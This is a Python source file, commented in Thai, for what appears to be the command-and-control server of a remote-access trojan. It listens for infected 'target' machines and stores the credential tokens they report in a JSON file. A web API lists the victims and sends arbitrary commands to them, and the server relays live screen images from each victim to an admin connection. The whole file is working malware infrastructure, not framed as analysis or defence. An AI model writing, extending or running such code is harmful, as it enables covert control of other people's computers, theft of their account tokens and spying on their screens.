import socket
import threading
import json
import os
from datetime import datetime
from flask import Flask, jsonify, request
from flask_cors import CORS

# --- การตั้งค่า ---
SOCKET_PORT = 5050
API_PORT = 8080 # Port สำหรับหน้าเว็บเรียกใช้
DB_FILE = "data/persistent_db.json"

if not os.path.exists("data"):
    os.makedirs("data")

app = Flask(__name__)
CORS(app) # อนุญาตให้หน้าเว็บเรียกใช้ API ได้

# ฐานข้อมูลกลาง
storage = {
    "targets": {}, # { "pc_name": { "tokens": [], "last_seen": "", "status": "Online", "conn": socket } }
    "admin_socket": None
}

def save_db():
    """บันทึกข้อมูลลงไฟล์ JSON เพื่อให้ข้อมูลไม่หายเมื่อ Server ปิด"""
    data = {}
    for name, info in storage["targets"].items():
        data[name] = {
            "tokens": info["tokens"],
            "last_seen": info.get("last_seen", "N/A"),
            "status": "Offline" # เมื่อเซฟลงดิสก์เราถือว่าเป็น Offline ไว้ก่อน
        }
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                storage["targets"] = json.load(f)
        except: pass

# --- API สำหรับหน้าเว็บ (Frontend) ---
@app.route('/api/targets', methods=['GET'])
def get_targets():
    """ส่งข้อมูลเครื่องทั้งหมดไปโชว์ที่หน้าเว็บ"""
    return jsonify(storage["targets"])

@app.route('/api/command', methods=['POST'])
def send_command():
    """รับคำสั่งจากหน้าเว็บไปสั่งเครื่องเป้าหมาย"""
    data = request.json
    pc_name = data.get("pc_name")
    cmd = data.get("command")
    
    if pc_name in storage["targets"] and storage["targets"][pc_name].get("conn"):
        try:
            storage["targets"][pc_name]["conn"].sendall(f"CMD:{cmd}".encode('utf-8'))
            return jsonify({"status": "success", "message": f"Sent '{cmd}' to {pc_name}"})
        except:
            return jsonify({"status": "error", "message": "Connection lost"}), 500
    return jsonify({"status": "error", "message": "PC is Offline"}), 400

# --- Socket Logic (คุยกับเครื่องเป้าหมาย) ---
def socket_handler():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', SOCKET_PORT))
    server.listen(100)
    print(f"[*] Socket Server listening on port {SOCKET_PORT}")

    while True:
        conn, addr = server.accept()
        threading.Thread(target=client_bridge, args=(conn, addr), daemon=True).start()

def client_bridge(conn, addr):
    target_name = None
    try:
        raw_identity = conn.recv(4096).decode('utf-8')
        if raw_identity == "ADMIN":
            storage["admin_socket"] = conn
            return

        identity = json.loads(raw_identity)
        target_name = identity["pc_name"]
        
        # อัปเดตข้อมูลและสถานะ
        storage["targets"][target_name] = {
            "tokens": identity.get("tokens", []),
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "Online",
            "conn": conn
        }
        save_db()
        print(f"[+] {target_name} is now Online")

        # วนลูปรับภาพ (ถ้าต้องการส่งต่อให้ Admin GUI เดิม)
        while True:
            header = conn.recv(12)
            if not header or len(header) < 12: break
            img_size = int.from_bytes(header[8:12], 'big')
            img_data = b""
            while len(img_data) < img_size:
                chunk = conn.recv(min(img_size - len(img_data), 65536))
                if not chunk: break
                img_data += chunk
            
            # ส่งต่อให้ Admin Socket (ถ้ามี)
            if storage["admin_socket"]:
                try:
                    storage["admin_socket"].sendall(target_name.encode('utf-8').ljust(32) + header + img_data)
                except: storage["admin_socket"] = None

    except: pass
    finally:
        if target_name in storage["targets"]:
            storage["targets"][target_name]["status"] = "Offline"
            storage["targets"][target_name]["conn"] = None
        conn.close()

if __name__ == "__main__":
    load_db()
    # รัน Socket Server ในพื้นหลัง
    threading.Thread(target=socket_handler, daemon=True).start()
    # รัน API Server (Flask)
    app.run(host='0.0.0.0', port=API_PORT)